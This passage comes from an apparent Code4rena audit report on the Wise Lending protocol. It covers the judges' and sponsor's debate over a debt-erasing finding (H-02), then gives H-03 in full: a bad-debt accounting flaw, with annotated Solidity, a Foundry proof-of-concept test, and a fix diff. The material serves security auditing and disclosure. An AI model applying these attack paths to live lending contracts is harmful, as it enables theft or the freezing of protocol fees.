> I would like to add that the original submission is passable but should have done a better job at:
> - Using only necessary snippets, with comments and tags.
> - Explain each logical step more simply (A calls B, B is pointer to C, C is doing X).
> 
> I believe the root cause and the attack was shown in the original submission and as such believe the finding to be valid and high severity.
>
> ### hickuphh3's (judge 2) input
>
> This issue should’ve been accompanied with a POC, then there would be no disambiguity over its validity and severity.
> 
> I agree with the judge’s assessment. The warden correctly identified the root cause of lacking input validation of `_poolToken`, which allows `_removePositionData` to incorrectly remove borrowed positions, thus erasing that user’s debt. 
> 
> The severity of this alone is high, as it effectively allows the user to forgo repaying his debt.
> 
> I disagree with the statement that the POC is different from the previous presented attack. It is roughly the same as the presented step-by-step walkthrough, with amplified impact: the user is able to borrow more tokens for free subsequently, without having to repay.
> 
> Disregarding the POC that was submitted after the audit, IMO, the line-by-line walkthrough sufficiently proved the issue. 
> 
> ### LSDan’s (judge 3) Input
> I think this one should be held as invalid due to [this ruling](https://docs.code4rena.com/awarding/judging-criteria/supreme-court-decisions-fall-2023#verdict-standardization-of-additional-warden-output-during-qa) in Decisions from the inaugural Supreme Court session.
>
> As far as I can see, the swaying information was the POC added after the submission deadline. It doesn't matter if the issue was technically correct. The quality was not high enough to lead the judge to mark it as satisfactory without the additional information. @Alex The Entreprenerd thoughts?
> 
> **Alex The Entreprenerd (Appellate Court lead judge) commented:**
> I don't think the POC added any additional info that was not present in the original submission. Invalid token causes default pop of real token. That was identified in the original submission.
> 
> I think the dispute by the sponsor was incorrect as asserting that this cannot be done atomically doesn't justify the bug of mismatch address causing defaults being forgiven. I think the POC added context over content.
> 
> **LSDan (judge 3) commented:** 
>Apologies guys... didn't read it carefully enough on the first pass. I've re-evaluated and while I don't like the quality of the original submission and would probably have invalidated it myself, I'm willing to align with the two of you and leave it as high risk. The attack is valid and the nuance is in interpreting rules, not validity.
> 
> ### Additional input from the Sponsor (Requested by the Lead Judge) via discord
> 
> **Alex The Entreprenerd (Appellate Court lead judge) commented:**
> For issue 215, I'd like to ask you what you think was invalid about the first submission and what's specifically makes the original submission different from the POC sent after? We understand that the quality of the original submission is sub optimal.
> 
> **Foon (Wise Lending):**
> Referenced the original comment [here](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2009516270).
>
> **Alex The Entreprenerd (Appellate Court lead judge) commented:**
> This makes sense as there is no way to attack the protocol in the same tx. However, if the price were to fall, then wouldn't the attacker be able to apply the attack mentioned in the original submission?
> 
> **hodldoor (Wise Lending) commented:**
> They will be liquidated beforehand. That why the submittor mentioned it is necessary to create a position which is small hence no incentivize to liquidate. Again, the way described by submittor does not work as pointed out in github and here again.
> 
> **Alex The Entreprenerd (Appellate Court lead judge) commented:**
> My understanding of the issue is that by specifying a non-existing token for liquidation, the first token is popped without paying for the position debt. Am I missing something about this?
> 
> **hodldoor (Wise Lending) commented:**
> Not for liquidation.<br>
> For payingback edit: `paybackBadDebtNoReward` only works for positions with bad debt, but bad debt usually accrues with debt and no collateral. Only time it doesn't is if collateral is so small gas is more expensive than to liquidate beforehand while price from collateral is falling.
> 
> **Foon (Wise Lending) commented:**
> For payingback bad debt positions with `paybackBadDebtNoReward()`, we added this feature to be able to remove bad debt from the protocol. User can do it and get a little incentive with `paybackBadDebtForToken()` or a generous donor. The team can pay it back for free with `paybackBadDebtNoReward()`. `paybackBadDebtForToken()` is only possible if there is some collateral left in the bad debt position nft.
> 
> **hodldoor (Wise Lending) commented:**
> the for free part is technically not needed anymore anyway since we opened paying back for everyone
> 
> **Alex The Entreprenerd (Appellate Court lead judge) commented:**
> Ok. What do you think changed from the original submission and the POC that makes the finding different?
> 
> **hodldoor (Wise Lending) commented:**
> You mean the PoC after deadline which is, therefore, not counted? He just manipulates price so that no one has the chance to liquidate. If we look at the point from the poc provided AFTER deadline (invalid therefore anyway), then we conclude it's an `expectedValue` question.
>
> Attacker either donates liquidation incentives to liquidators and therefore, loses money (10%). Or gains money if he's lucky that he doesn't get liquidated within a 10-20% price difference and gets to call the other function first.
> So if you think as an attacker the probability that ETH drops 20% in one chainlink update (as far as I know, that has never happened before) or that during a 20% drawdown liquidators don't get put into a block and this likelihood is bigger than 5% OVERALL then you would make money.
>
>The chance of liquidators not picking up free money I would say is more in the low 0.001% estimation rather than 5%. So on average it's highly minus -ev to do that.
> 
> **Alex The Entreprenerd (Appellate Court lead judge) commented:**
> Good points, thank you for your thoughts! What are your considerations about the fact that the attacker could just participate in the MEV race, allowing themselves to either front-run or be the first to self-liquidate as a means to enact the attack?
> 
> Shouldn't the system ideally prevent this scenario from ever being possible?
> 
> **The Wise Admiral (Wise Lending) commented:**
> I'll let my devs comment on your question about the attacker participating as a liquidator, but as far as the last part about "shouldn't the system prevent"
> 
> I do not believe our position on this finding is that it's objectively invalid. In fact, I'm sure we have already patched it for our live code which is already deployed on Arbitrum. Our position is that, per the C4 rules the submission is invalid for this specific competitive audit Feb 19th - March 11th and should not be listed in the findings or receive rewards, as it would be unfair to take away money from the other wardens who did submit findings in the time frame given. That being said, we are willing to accept it as a medium finding as a compromise.
>
> **hodldoor (Wise Lending) commented:**
> The attack does not start with liquidating it is stopped by liquidating (including if the attacker liquidates), if it's in time relating to liquidation incentive vs distance between collateral in debt in percentage. That's why in a poc you need to manipulate price instantly a great deal without being liquidated (doesn't matter by whom).
> 
> ### Deliberation
> 
> We believe that the dispute from the Sponsor comes from a misunderstanding of the submission which ultimately shows an incorrect logic when dealing with liquidations.
> 
> While the specifics of the submission leave a lot to be desired, the original submission did identify the root cause, this root cause can be weaponized in a myriad of ways, and ultimately gives the chance to an underwater borrower to get a long forgiven.
> 
> For this reason we believe the finding to be a High Severity finding.
> 
> ### Additional Context by the Lead Judge
> 
> We can all agree that a POC of higher quality should have been sent, that said our objective at C4 is to prevent real exploits, over a sufficiently long span of time, dismissing barely passable findings would cause more exploits, which will cause real damage to Projects and People using them as well as taint the reputation of C4 as a place where “No stone is left unturned”.
> 
> I would recommend the staff to look into ways to penalize these types of findings (for example, give a bonus to the judge as an extensive amount of time was necessary to prove this finding).
> 
> But I fail to see how dismissing this report due to a lack of POC would help the Sponsor and Code4rena over the long term.

**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2082895779):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).

***

## [[H-03] Incorrect bad debt accounting can lead to a state where the `claimFeesBeneficial` function is permanently bricked and no new incentives can be distributed, potentially locking pending and future protocol fees in the `FeeManager` contract](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/74)
*Submitted by [JCN](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/74), also found by [serial-coder](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/243), [0xStalin](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/219), and [Draiakoo](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/204)*

Protocol fees can be collected from the `WiseLending` contract and sent to the `FeeManager` contract via the permissionless `FeeManager::claimWiseFees` function. During this call, incentives will only be distributed for `incentive owners` if `totalBadDebtETH` (global bad debt) is equal to `0`:

[`FeeManager::claimWiseFees`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L663-L670)

```solidity
663:        if (totalBadDebtETH == 0) { // @audit: incentives only distributed if there is no global bad debt
664:
665:            tokenAmount = _distributeIncentives( // @audit: distributes incentives for `incentive owners` via `gatheredIncentiveToken` mapping
666:                tokenAmount,
667:                _poolToken,
668:                underlyingTokenAddress
669:            );
670:        }
```

The fees sent to the `FeeManager` are then able to be claimed by `beneficials` via the `FeeManager::claimFeesBeneficial` function or by `incentive owners` via the `FeeManager::claimIncentives` function (if incentives have been distributed to the owners):

[`FeeManager::claimIncentives`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L284-L293)

```solidity
284:    function claimIncentives(
285:        address _feeToken
286:    )
287:        public
288:    {
289:        uint256 amount = gatheredIncentiveToken[msg.sender][_feeToken]; // @audit: mapping incremented in _distributeIncentives function
290:
291:        if (amount == 0) {
292:            revert NoIncentive();
293:        }
```

However, `beneficials` are only able to claim fees if there is currently no global bad debt in the system (`totalBadDebtETH == 0`).

[`FeeManager::claimFeesBeneficial`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L689-L699)

```solidity
689:    function claimFeesBeneficial(
690:        address _feeToken,
691:        uint256 _amount
692:    )
693:        external
694:    {
695:        address caller = msg.sender;
696:
697:        if (totalBadDebtETH > 0) { // @audit: can't claim fees when there is bad debt
698:            revert ExistingBadDebt();
699:        }
```

Below I will explain how the bad debt accounting logic used during partial liquidations can result in a state where `totalBadDebtETH` is permanently greater than `0`. When this occurs, `beneficials` will no longer be able to claim fees via the `FeeManager::claimFeesBeneficial` function and new incentives will no longer be distributed when fees are permissionlessly collected via the `FeeManager::claimWiseFees` function.

When a position is partially liquidated, the `WiseSecurity::checkBadDebtLiquidation` function is executed to check if the position has created bad debt, i.e. if the position's overall borrow value is greater than the overall (unweighted) collateral value. If the post liquidation state of the position created bad debt, then the bad debt is recorded in a global and position-specific state:

[`WiseSecurity::checkBadDebtLiquidation`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L405-L436)

```solidity
405:    function checkBadDebtLiquidation(
406:        uint256 _nftId
407:    )
408:        external
409:        onlyWiseLending
410:    {
411:        uint256 bareCollateral = overallETHCollateralsBare(
412:            _nftId
413:        );
414:
415:        uint256 totalBorrow = overallETHBorrowBare(
416:            _nftId
417:        );
418:
419:        if (totalBorrow < bareCollateral) { // @audit: LTV < 100%
420:            return;
421:        }
422:
423:        unchecked {
424:            uint256 diff = totalBorrow
425:                - bareCollateral;
426:
427:            FEE_MANAGER.increaseTotalBadDebtLiquidation( // @audit: global state, totalBadDebtETH += diff
428:                diff
429:            );
430:
431:            FEE_MANAGER.setBadDebtUserLiquidation( // @audit: position state, badDebtPosition[_nftId] = diff
432:                _nftId,
433:                diff
434:            );
435:        }
436:    }
```

[`FeeManagerHeper.sol`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManagerHelper.sol#L77-L94)

```solidity
77:    function _setBadDebtPosition(
78:        uint256 _nftId,
79:        uint256 _amount
80:    )
81:        internal
82:    {
83:        badDebtPosition[_nftId] = _amount; // @audit: position bad debt set
84:    }
85:
86:    /**
87:     * @dev Internal increase function for global bad debt amount.
88:     */
89:    function _increaseTotalBadDebt(
90:        uint256 _amount
91:    )
92:        internal
93:    {
94:        totalBadDebtETH += _amount; // @audit: total bad debt incremented
```

As we can see above, the method by which the global and position's state is updated is not consistent (total debt increases, but position's debt is set to recent debt). Since liquidations can be partial, a position with bad debt can undergo multiple partial liquidations and each time the `totalBadDebtETH` will be incremented. However, the `badDebtPosition` for the position will only be updated with the most recent bad debt that was recorded during the last partial liquidation. Note that due to the condition on line 419 of `WiseSecurity::checkBadDebtLiquidation`, the `badDebtPosition` will be reset to `0` when `totalBorrow == bareCollateral` (`LTV == 100%`). However, in this case, any previously recorded bad debt for the position will *not* be deducted from the `totalBadDebtETH`. Lets consider two examples:

**Scenario 1**: Due to a market crash, a position's LTV goes above 100%. The position gets partially liquidated, incrementing `totalBadDebtETH` by `x` (bad debt from 1st liquidation) and setting `badDebtPosition[_nftId]` to `x`. The position gets partially liquidated again, this time incrementing `totalBadDebtETH` by `y` (bad debt from 2nd liquidation) and setting `badDebtPosition[_nftId]` to `y`. The resulting state:

```
totalBadDebtETH == x + y
badDebtPosition[_nftId] == y
```

**Scenario 2**: Due to a market crash, a position's LTV goes above 100%. The position gets partially liquidated, incrementing `totalBadDebtETH` by `x` and setting `badDebtPosition[_nftId]` to `x`. The position gets partially liquidated again, but this time the `totalBorrow` is equal to `bareCollateral` (`LTV == 100%`) and thus no bad debt is created. Due to the condition on line 419, `totalBadDebtETH` will be incremented by `0`, but `badDebtPosition[_nftId]` will be reset to `0`. The resulting state:

```
totalBadDebtETH == x
badDebtPosition[_nftId] == 0
```

Note: Scenario 1 is more likely to occur since Scenario 2 requires the additional partial liquidation to result in an LTV of exactly 100% for the position.

As we can see, partial liquidations can lead to `totalBadDebtETH` being artificially inflated with respect to the actual bad debt created by a position.

When bad debt is created, it is able to be paid back via the [`FeeManager::paybackBadDebtForToken`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L730-L744) or [`FeeManager::paybackBadDebtNoReward`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L816-L826) functions. However, the maximum amount of bad debt that can be deducted during these calls is capped at the bad debt recorded for the position specified (`badDebtPosition[_nftId]`). Therefore, the excess "fake" bad debt can not be deducted from `totalBadDebtETH`, resulting in `totalBadDebtETH` being permanently greater than `0`.

Below is the logic that deducts the bad debt created by a position when it is paid off via one of the payback functions mentioned above:

[`FeeManagerHelper::_updateUserBadDebt`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManagerHelper.sol#L170-L181)

```solidity
170:        unchecked {
171:            uint256 newBadDebt = currentBorrowETH
172:                - currentCollateralBareETH;
173:
174:            _setBadDebtPosition( // @audit: badDebtPosition[_nftId] = newBadDebt
175:                _nftId,
176:                newBadDebt
177:            );
178:
179:            newBadDebt > currentBadDebt // @audit: totalBadDebtETH updated with respect to change in badDebtPosition
180:                ? _increaseTotalBadDebt(newBadDebt - currentBadDebt)
181:                : _decreaseTotalBadDebt(currentBadDebt - newBadDebt);
```

The above code is invoked in the [`FeeManagerHelper::updatePositionCurrentBadDebt`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManagerHelper.sol#L270-L285) function, which is in turn invoked during both of the payback functions previously mentioned. You will notice that the above code properly takes into account the change in the bad debt of the position in question. I.e. if the `badDebtPosition[_nftId]` decreased (after being paid back), then the `totalBadDebtETH` will decrease as well. Therefore, the `totalBadDebtETH` can only be deducted by at most the current bad debt of a position. Returning to the previous example in Scenario 1, this means that `totalBadDebtETH` would remain equal to `x`, since only `y` amount of bad debt can be paid back.

### Impact

In the event a position creates bad debt, partial liquidations of that position can lead to the global `totalBadDebtETH` state variable being artificially inflated. This additional "fake debt" can not be deducted from the global state when the actual bad debt of the position is paid back. Thus, the `FeeManager::claimFeesBeneficial` function will be permanently DOS-ed, preventing any `beneficials` from claiming fees in the `FeeManager` contract. Additionally, no new incentives are able to be distributed to `incentive owners` in this state. However, protocol fees can still be collected in this state via the permissionless `FeeManager::claimWiseFees` function, and since `incentive owners` and `beneficials` are the only entities able to claim these fees, this can lead to fees being permanently locked in the `FeeManager` contract.

### Justification for Medium Severity

Although not directly affecting end users, the function of claiming beneficial fees and distributing new incentives will be permanently bricked. To make matters worse, anyone can continue to collect fees via the permissionless `FeeManager::claimWiseFees` function, which will essentially "burn" any pending or future fees by locking them in the `FeeManager` (assuming all previously gathered incentives have been claimed). This value is, therefore, leaked from the protocol every time additional fees are collected in this state.

Once this state is reached, any pending or future fees should ideally be left in the `WiseLending` contract, providing value back to the users instead of allowing that value to be unnecessarily "burned". However, the permissionless nature of the `FeeManager::claimWiseFees` function allows bad actors to further grief the protocol during this state by continuing to collect fees.

Note: Once this state is reached, and `WiseLending` is made aware of the implications, all fees (for all pools) can be set to `0` by the `master` address. This would ensure that no future fees are sent to the `FeeManager`. However, this does not stop pending fees from being collected. Additionally, a true decentralized system (such as a DAO) would likely have some latency between proposing such a change (decreasing fee value) and executing that change. Therefore, any fees distributed during that period can be collected.

### Proof of Concept

Place the following test in the `contracts/` directory and run with `forge test --match-path contracts/BadDebtTest.t.sol`:

<details>

```solidity
// SPDX-License-Identifier: -- WISE --

pragma solidity =0.8.24;

import "./WiseLendingBaseDeployment.t.sol";

contract BadDebtTest is BaseDeploymentTest {
    address borrower = address(0x01010101);
    address lender = address(0x02020202);

    uint256 depositAmountETH = 10e18; // 10 ether
    uint256 depositAmountToken = 10; // 10 ether
    uint256 borrowAmount = 5e18; // 5 ether

    uint256 nftIdLiquidator; // nftId of lender
    uint256 nftIdLiquidatee; // nftId of borrower

    uint256 debtShares;

    function _setupIndividualTest() internal override {
        _deployNewWiseLending(false);

        // set token value for simple calculations
        MOCK_CHAINLINK_2.setValue(1 ether); // 1 token == 1 ETH
        assertEq(MOCK_CHAINLINK_2.latestAnswer(), MOCK_CHAINLINK_ETH_ETH.latestAnswer());
        vm.stopPrank();
        
        // fund lender and borrower
        vm.deal(lender, depositAmountETH);
        deal(address(MOCK_WETH), lender, depositAmountETH);
        deal(address(MOCK_ERC20_2), borrower, depositAmountToken * 2);
    }


    function testScenario1() public {
        // --- scenario is set up --- //
        _setUpScenario();

        // --- shortfall event/crash creates bad debt, position partially liquidated logging bad debt --- //
        _marketCrashCreatesBadDebt();

        // --- borrower gets partially liquidated again --- //
        vm.prank(lender);

        LENDING_INSTANCE.liquidatePartiallyFromTokens(
            nftIdLiquidatee,
            nftIdLiquidator, 
            address(MOCK_WETH),
            address(MOCK_ERC20_2),
            debtShares * 2e16 / 1e18
        );

        // --- global bad det increases again, but user bad debt is set to current bad debt created --- // 
        uint256 newTotalBadDebt = FEE_MANAGER_INSTANCE.totalBadDebtETH();
        uint256 newUserBadDebt = FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);
        
        assertGt(newUserBadDebt, 0); // userBadDebt reset to new bad debt, newUserBadDebt == current_bad_debt_created
        assertGt(newTotalBadDebt, newUserBadDebt); // global bad debt incremented again
        // newTotalBadDebt = old_global_bad_debt + current_bad_debt_created
        
        // --- user bad debt is paid off, but global bad is only partially paid off (remainder is fake debt) --- // 
        _tryToPayBackGlobalDebt();

        // --- protocol fees can no longer be claimed since totalBadDebtETH will remain > 0 --- // 
        vm.expectRevert(bytes4(keccak256("ExistingBadDebt()")));
        FEE_MANAGER_INSTANCE.claimFeesBeneficial(address(0), 0);
    }

    function testScenario2() public {
        // --- scenario is set up --- // 
        _setUpScenario();

        // --- shortfall event/crash creates bad debt, position partially liquidated logging bad debt --- //
        _marketCrashCreatesBadDebt();
        
        // --- Position manipulated so second partial liquidation results in totalBorrow == bareCollateral --- //
        // borrower adds collateral
        vm.prank(borrower);

        LENDING_INSTANCE.solelyDeposit(
            nftIdLiquidatee, 
            address(MOCK_ERC20_2), 
            6
        );

        // borrower gets partially liquidated again
        vm.prank(lender);

        LENDING_INSTANCE.liquidatePartiallyFromTokens(
            nftIdLiquidatee,
            nftIdLiquidator, 
            address(MOCK_WETH),
            address(MOCK_ERC20_2),
            debtShares * 2e16 / 1e18
        );
        
        uint256 collateral = SECURITY_INSTANCE.overallETHCollateralsBare(nftIdLiquidatee);
        uint256 debt = SECURITY_INSTANCE.overallETHBorrowBare(nftIdLiquidatee);
        assertEq(collateral, debt); // LTV == 100% exactly

        // --- global bad debt is unchanged, while user bad debt is reset to 0 --- // 
        uint256 newTotalBadDebt = FEE_MANAGER_INSTANCE.totalBadDebtETH();
        uint256 newUserBadDebt = FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);

        assertEq(newUserBadDebt, 0); // user bad debt reset to 0
        assertGt(newTotalBadDebt, 0); // global bad debt stays the same (fake debt)

        // --- attempts to pay back fake global debt result in a noop, totalBadDebtETH still > 0 --- // 
        uint256 paybackShares = _tryToPayBackGlobalDebt();
        
        assertEq(LENDING_INSTANCE.userBorrowShares(nftIdLiquidatee, address(MOCK_WETH)), paybackShares); // no shares were paid back

        // --- protocol fees can no longer be claimed since totalBadDebtETH will remain > 0 --- //
        vm.expectRevert(bytes4(keccak256("ExistingBadDebt()")));
        FEE_MANAGER_INSTANCE.claimFeesBeneficial(address(0), 0);
    }

    function _setUpScenario() internal {
        // lender supplies ETH
        vm.startPrank(lender);

        nftIdLiquidator = POSITION_NFTS_INSTANCE.mintPosition();

        LENDING_INSTANCE.depositExactAmountETH{value: depositAmountETH}(nftIdLiquidator);

        vm.stopPrank();

        // borrower supplies collateral token and borrows ETH
        vm.startPrank(borrower);

        MOCK_ERC20_2.approve(address(LENDING_INSTANCE), depositAmountToken * 2);

        nftIdLiquidatee = POSITION_NFTS_INSTANCE.mintPosition();
        
        LENDING_INSTANCE.solelyDeposit( // supply collateral
            nftIdLiquidatee, 
            address(MOCK_ERC20_2), 
            depositAmountToken
        );

        debtShares = LENDING_INSTANCE.borrowExactAmountETH(nftIdLiquidatee, borrowAmount); // borrow ETH

        vm.stopPrank();
    }

    function _marketCrashCreatesBadDebt() internal {
        // shortfall event/crash occurs
        vm.prank(MOCK_DEPLOYER);

        MOCK_CHAINLINK_2.setValue(0.3 ether);

        // borrower gets partially liquidated
        vm.startPrank(lender);

        MOCK_WETH.approve(address(LENDING_INSTANCE), depositAmountETH);

        LENDING_INSTANCE.liquidatePartiallyFromTokens(
            nftIdLiquidatee,
            nftIdLiquidator, 
            address(MOCK_WETH),
            address(MOCK_ERC20_2),
            debtShares * 2e16 / 1e18 + 1 
        );

        vm.stopPrank();

        // global and user bad debt is increased
        uint256 totalBadDebt = FEE_MANAGER_INSTANCE.totalBadDebtETH();
        uint256 userBadDebt = FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);

        assertGt(totalBadDebt, 0); 
        assertGt(userBadDebt, 0);
        assertEq(totalBadDebt, userBadDebt); // user bad debt and global bad debt are the same
    }

    function _tryToPayBackGlobalDebt() internal returns (uint256 paybackShares) {
        // lender attempts to pay back global debt
        paybackShares = LENDING_INSTANCE.userBorrowShares(nftIdLiquidatee, address(MOCK_WETH));
        uint256 paybackAmount = LENDING_INSTANCE.paybackAmount(address(MOCK_WETH), paybackShares);

        vm.startPrank(lender);

        MOCK_WETH.approve(address(FEE_MANAGER_INSTANCE), paybackAmount);
        
        FEE_MANAGER_INSTANCE.paybackBadDebtNoReward(
            nftIdLiquidatee, 
            address(MOCK_WETH), 
            paybackShares
        );

        vm.stopPrank();

        // global bad debt and user bad debt updated
        uint256 finalTotalBadDebt = FEE_MANAGER_INSTANCE.totalBadDebtETH();
        uint256 finalUserBadDebt = FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);

        assertEq(finalUserBadDebt, 0); // user has no more bad debt, all paid off
        assertGt(finalTotalBadDebt, 0); // protocol still thinks there is bad debt
    }
}
```

</details>

### Recommended Mitigation Steps

I would recommend updating `totalBadDebtETH` with the `difference` of the previous and new bad debt of a position in the `WiseSecurity::checkBadDebtLiquidation` function, similar to how it is done in the `FeeManagerHelper::_updateUserBadDebt` internal function.

Example implementation:

```diff
diff --git a/./WiseSecurity/WiseSecurity.sol b/./WiseSecurity/WiseSecurity.sol
index d2cfb24..75a34e8 100644
--- a/./WiseSecurity/WiseSecurity.sol
+++ b/./WiseSecurity/WiseSecurity.sol
@@ -424,14 +424,22 @@ contract WiseSecurity is WiseSecurityHelper, ApprovalHelper {
             uint256 diff = totalBorrow
                 - bareCollateral;

-            FEE_MANAGER.increaseTotalBadDebtLiquidation(
-                diff
-            );
+            uint256 currentBadDebt = FEE_MANAGER.badDebtPosition(_nftId);

             FEE_MANAGER.setBadDebtUserLiquidation(
                 _nftId,
                 diff
             );
+
+            if (diff > currentBadDebt) {
+                FEE_MANAGER.increaseTotalBadDebtLiquidation(
+                    diff - currentBadDebt
+                );
+            } else {
+                FEE_MANAGER.decreaseTotalBadDebtLiquidation(
+                    currentBadDebt - diff
+                );
+            }
         }
     }
```

**[Trust (judge) increased severity to High](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/74#issuecomment-2021274755)**

**[vonMangoldt (Wise Lending) commented via duplicate issue #243](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/243#issuecomment-2009558588):**
> This doesn't lead to loss of user funds though. Hence, it should be downgraded since one could just migrate and redeploy after discovering that. Otherwise good find.

**[Foon256 (Wise Lending) commented via duplicate issue #243](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/243#issuecomment-2009622123):**
> Would agree with that! This is a good insight, but users' funds are never at risk. This is related to the `feeManager` and the fees taken from the protocol. Therefore, a Medium issue.

**[Alex the Entreprenerd (Appellate Court judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/74#issuecomment-2056796083):**
 > ### Summary of the issue
 >
> When a market accrues bad debt, which can be inflated due to an accounting error, fees and incentives will no longer be distributed.
> *Note: The discussion had quite a bit of back and forth, for this reason the whole conversation is pasted below:*
> 
> ### Discussion
>
> **Alex the Entreprenerd (Appellate Court lead judge) commented:**
> This seems to be tied to a specific interpretation of this discussion we've had around loss of yield as high.
> 
> **hickuphh3 (judge 2) commented:**
> Fees would be considered as matured yield? Given that it extends beyond the protocol to beneficials and incentive owners, I'm leaning towards a high more than a medium.
> 
> **Alex the Entreprenerd (Appellate Court lead judge) commented:**
> Yes it would be considered matured. I don't have an opinion on this report yet and will follow up later today with my notes.
>
>Not fully made up my mind but here's a couple of points:
> 
> For Medium: Loss of Yield -> There is no loss of principal so Med seems fine.
> 
> For High: The contract is not losing yield in some case, the contract is losing 100% of all yield. The contract is no longer serving it's purpose.
> 
> External Conditions: Bad debt must be formed. Bad debt handling is part of the system design, so assuming this can happen is fair, and starting from a scenario in which this can happen is also fair.
> 
> That said, in reality, this may never happen.
> 
> My main point for downgrading is that while the contract is losing all of the yield, nothing beside that is impacted, not fully sure on this one.
> 
> **LSDan (judge 3) commented:**
> I'm aligned with high on this one. Even though the conditions that lead to it are rare and there are arguably external conditions in some scenarios, there is a direct loss of funds and the functional loss of a contract's purpose. Once this situation occurs, there is no clean way back from it.
> 
> **Alex the Entreprenerd (Appellate Court lead judge) commented:**
> I think this is the issue where we will have some contention. I think the Sponsor interpretation is important to keep in mind as it's pretty rational. I would like to think about it a bit more.
> 
>**Alex the Entreprenerd (Appellate Court lead judge) commented:**
> I'm leaning towards Med on this report, I think the Sponsors POV is valid.
> 
> There is an accounting error, it would not cause permanent loss of funds. It would be mitigated by deprecating the market and creating a new one.
> 
> My main argument is that if this was live, this would trigger a re-deploy but it would not trigger any white hat rescue operation, as funds would be safe.
> 
> **hickuphh3 (judge 2) commented**:
> [#74](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/74): When we stick to the c4a rules to which we agreed, all the loss of fees are no user funds and therefore, should be treated differently.
> 
> The core argument for Medium severity is that fees are a secondary concern.
> 
> This goes against the supreme court decision where fees shouldn't be treated as 2nd class citizens [here](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization#loss-of-fees-as-low).
> 
> Loss of fees should be regarded as an impact similar to any other loss of capital. Loss of real amounts depends on specific conditions and likelihood considerations.
> 
> Likelihood: Requirement of bad debt formation. Once there is, funds (fees) are permanently bricked. 
> 
> There is an accounting error, it would not cause permanent loss of funds; it would be mitigated by deprecating the market and creating a new one.
> 
> The funds you are referring to are user funds? Separately, I don't see how it would mitigate the bricking once it happens.
> 
> **Alex the Entreprenerd (Appellate Court lead judge) commented:**
> I don't think that the ruling means that loss of fees should be treated as high at all times.
> 
> The main argument is that the broken accounting doesn't create a state that is not recoverable:
> - Some fees are lost.
> - User deprecates market (raises interests or pauses).
> - Deployes new Market.
> - System resumes functioning as intended.
> 
> My main argument is that this would not cause a War Room, it would cause a deprecation that the system can handle.
> 
> **hickuphh3 (judge 2) commented:**
> In what cases/scenarios would loss of fees be high then? Most, if not all, won't have a war room for protocol fees.
> 
> The reason I would consider to justify downgrading is the low likelihood of the external requirement of bad debt formation `+` `>=` 2 partial liquidations.
> 
> I would dissent and argue for high severity. 
> - Permanent loss of unclaimed fees.
> - Blast radius: affects not just the protocol, but incentive owners and beneficiaries.
>
>Had the fees gone only to the protocol, I'd lean a bit more towards Medium.
> 
> Is `WiseLending` immutable in a `poolToken` instance? 
> 
> What contracts would have to be re-deployed?
> 
> **Alex the Entreprenerd (Appellate Court lead judge) commented:**
> Liquidation premium being denied could be a valid High loss of yield, loss of gas for refunds when the system entire goal is that (e.g. keepers, voting on Nouns).
> 
> ### Alex the Entreprenerd's (Appellate Court lead judge) Input
>
> The finding shows how in the specific case of liquidations with bad debt, a market will stop accounting for fees.
> 
> 2 aggravating circumstances seem to be:
> - Inability to pause and replace each market.
> - The Math for bad debt is also wrong, leading to the inability to fix the bug.
> 
> This would still cause a loss of fees for a certain period of time, as the admin would eventually be able to set the market fees to either a state that would cause users to stop using it or `0` as a means to stop the loss.
> 
> I think that the accounting mistake is notable, and I understand the reasoning for raising severity.
> 
> That said, because we have to judge by impact of the finding, I believe Medium Severity to be most appropriate.
> 
> ### hickuphh3's (judge 2) Input
>
> I maintain my stance for High severity for the reasons I stated above:
> - Permanent loss of unclaimed fees.
> - Impact on protocol ecosystem: beneficiaries and incentive owners.
> 
> ### LSDan’s (judge 3) Input
>
> I'm still of the opinion that High is most appropriate here. The impact is significant enough that raising the severity beyond medium makes sense.
> 
> ### Deliberation
>
> The severity is kept at High Severity, with a non-unanimous verdict.
> 
> ### Additional Context by the Lead Judge
> 
> I recommend monitoring how this decision influences future decisions on severities, especially when it comes to a percentage loss of yield, an attacker having the button to cause a loss of yield, against this instance which is the permanent inability for the contract to record a gain of yield. 

**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/74#issuecomment-2082898865):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).

***

## [[H-04] Liquidators can pay less than required to completely liquidate the private collateral balance of an uncollateralized position](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/33)
*Submitted by [nonseodion](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/33)*

